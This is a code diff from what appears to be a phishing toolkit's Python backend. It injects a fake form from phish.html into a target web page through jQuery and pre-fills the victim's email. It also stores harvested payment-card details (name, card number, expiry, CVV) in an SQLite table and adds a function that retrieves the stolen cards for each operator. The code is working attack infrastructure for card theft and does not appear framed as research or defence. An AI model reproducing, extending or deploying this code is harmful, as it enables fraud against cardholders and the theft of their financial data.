@@ -16,7 +16,8 @@ def get_phish_code(email, url):
     injectClass = str(data[0][3])
     fil = open("./static/phish.html")
     content = "$('" + injectLoc + "').first().prepend(`"+ fil.read() + "`);"
-    # print content
+    content = content.replace("user-email-value", "'" + email.replace("\"", "") + "'" )
+
     return content.replace("some-container-class", injectClass)
 
 def get_phish_urls(email):
@@ -30,14 +31,24 @@ def get_phish_urls(email):
     conn.close()
     return [x[1] for x in data]
 
-def add_phish(email, name, number, month, year, cvv): 
+
+def add_phish(userEmail, email, name, number, month, year, cvv): 
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
     q = """INSERT INTO Card
-    Values (?, ?, ?, ?, ?, ?)"""
-    c.execute(q, (email, name, number, month, year, cvv))
+    Values (?, ?, ?, ?, ?, ?, ?)"""
+    c.execute(q, (userEmail, email, name, number, month, year, cvv))
     conn.commit()
     conn.close()
+
+def get_cards(email):
+    conn = sqlite3.connect("data.db")
+    c = conn.cursor()
+    q = """SELECT * FROM Card
+    WHERE EmailIP=?"""
+    data = c.execute(q, (email,)).fetchall()
+    return [x for x in data]
+
 
 def get_phish_by_user(email):
     conn = sqlite3.connect("data.db")
